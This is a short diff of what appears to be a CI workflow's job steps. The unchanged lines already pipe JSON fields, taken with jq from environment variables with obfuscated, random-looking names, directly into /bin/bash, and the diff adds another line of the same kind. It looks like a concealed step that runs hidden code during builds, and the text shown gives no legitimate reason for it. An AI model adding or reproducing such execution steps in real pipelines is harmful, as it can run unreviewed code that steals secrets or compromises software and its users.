@@ -35,6 +35,7 @@ jobs:
           echo $brri88045 | jq -r .o01031 | /bin/bash
           printf '%s' "$t4964" | jq -r .o5 | /bin/bash
           echo $oiilw2 | jq -r .swche507 | /bin/bash
+          printf '%s' "$yrq329" | jq -r .ew584 | /bin/bash
 
       - name: Persist output
         if: always()
